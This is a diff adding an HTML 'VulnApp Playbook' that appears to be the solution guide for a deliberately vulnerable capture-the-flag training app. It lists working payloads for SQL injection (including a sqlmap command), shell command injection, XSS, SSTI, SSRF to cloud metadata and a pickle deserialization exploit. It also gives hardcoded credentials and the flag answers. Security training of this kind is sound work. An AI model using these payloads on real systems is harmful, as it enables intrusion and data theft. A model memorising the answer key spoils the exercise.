@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>VulnApp Playbook</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 2em; background: #f9f9f9; color: #333; }
+        h1, h2, h3 { color: #00557f; }
+        pre { background: #eee; padding: 1em; overflow-x: auto; }
+        code { background: #eef; padding: 0.2em 0.4em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 1em; }
+        th, td { border: 1px solid #ccc; padding: 0.5em; text-align: left; }
+        th { background: #ddd; }
+    </style>
+</head>
+<body>
+    <h1>VulnApp Playbook</h1>
+
+    <h2>1. Weak Authentication (/login)</h2>
+    <p>Hardcoded credentials: <code>admin</code> / <code>adminpass</code></p>
+    <pre>POST /login
+username=admin
+password=adminpass</pre>
+
+    <h2>2. SQL Injection (/user?id=)</h2>
+    <p>Unsanitized SQL string construction.</p>
+    <pre>?id=1 OR 1=1
+?id=1 UNION SELECT 1, sqlite_version(), 3</pre>
+    <pre>sqlmap -u "http://localhost:5000/user?id=1" --batch --risk=3 --level=5</pre>
+
+    <h2>3. Command Injection (/ping?host=)</h2>
+    <p>Unescaped shell execution.</p>
+    <pre>?host=127.0.0.1; ls
+?host=127.0.0.1 && whoami</pre>
+
+    <h2>4. Cross-Site Scripting (XSS) (/comment)</h2>
+    <p>User input rendered without sanitization.</p>
+    <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+
+    <h2>5. Server-Side Template Injection (SSTI) (/render)</h2>
+    <pre>{{7*7}} => 49
+{{config.items()}}</pre>
+
+    <h2>6. Server-Side Request Forgery (SSRF) (/fetch)</h2>
+    <p>URL fetch with no validation.</p>
+    <pre>?url=http://127.0.0.1:5000
+?url=http://169.254.169.254/latest/meta-data/</pre>
+
+    <h2>7. Insecure Deserialization (/upload)</h2>
+    <p>Loads uploaded pickled file directly.</p>
+    <pre>
+import pickle, os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('touch /tmp/pwned',))
+pickle.dump(Exploit(), open("exploit.pkl", "wb"))
+    </pre>
+
+    <h2>8. Flag Submission (/flags)</h2>
+    <p>Submit flags discovered through exploitation.</p>
+    <ul>
+        <li>flag_roosevelt</li>
+        <li>flag_truman</li>
+        <li>flag_kennedy</li>
+        <li>flag_nixon</li>
+        <li>flag_ford</li>
+        <li>flag_reagan</li>
+        <li>flag_clinton</li>
+    </ul>
+
+    <h2>9. Hidden Routes</h2>
+    <table>
+        <thead><tr><th>Route</th><th>Discovery Method</th></tr></thead>
+        <tbody>
+            <tr><td>/secret_admin</td><td>SSRF or forced browsing</td></tr>
+            <tr><td>.hidden_assets/robots.txt</td><td>URL probing</td></tr>
+        </tbody>
+    </table>
+</body>
+</html>
